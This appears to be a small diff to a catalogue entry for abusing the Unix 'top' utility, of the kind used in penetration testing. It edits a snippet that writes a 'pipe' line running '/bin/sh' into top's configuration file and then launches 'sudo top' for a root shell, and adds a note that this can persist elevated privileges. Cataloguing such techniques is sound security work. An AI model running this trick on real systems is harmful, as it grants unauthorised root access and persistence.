@@ -8,8 +8,9 @@ functions:
         # press return twice
         reset
   sudo:
-    - code: |
-        echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
+    - description: This requires that the root configuration file is writable and might be used to persist elevated privileges.
+      code: |
+        echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
         sudo top
         # press return twice
         reset
